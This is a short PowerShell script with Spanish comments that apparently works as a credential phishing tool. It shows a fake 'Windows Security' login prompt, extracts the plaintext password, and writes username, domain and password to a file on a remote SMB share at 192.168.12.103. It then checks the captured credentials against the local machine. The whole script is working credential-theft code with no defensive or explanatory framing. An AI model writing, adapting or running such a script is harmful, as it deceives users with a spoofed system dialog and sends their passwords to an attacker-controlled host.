param([string]$username)

# Pedir credenciales al usuario
$cred = $Host.ui.PromptForCredential("Windows Security", "Por favor, ingresa tus credenciales", "$env:userdomain\$username","")

# Obtener el dominio del entorno
$domain = "$env:userdomain"

# Formar el nombre de usuario completo
$full = "$domain\$username"

# Obtener la contraseña del objeto de credenciales
$password = $cred.GetNetworkCredential().password

# Definir la contraseña de la carpeta compartida
$smbPassword = "noaut1"

# Obtener las credenciales válidas
$output = $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password

# Especifica la ruta del recurso compartido SMB
$smbPath = "\\192.168.12.103\no_autorizado\datos.txt"

# Copiar la salida al servidor SMB
$output | Out-File -FilePath $smbPath

    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    
    $DS.ValidateCredentials("$username", "$password")
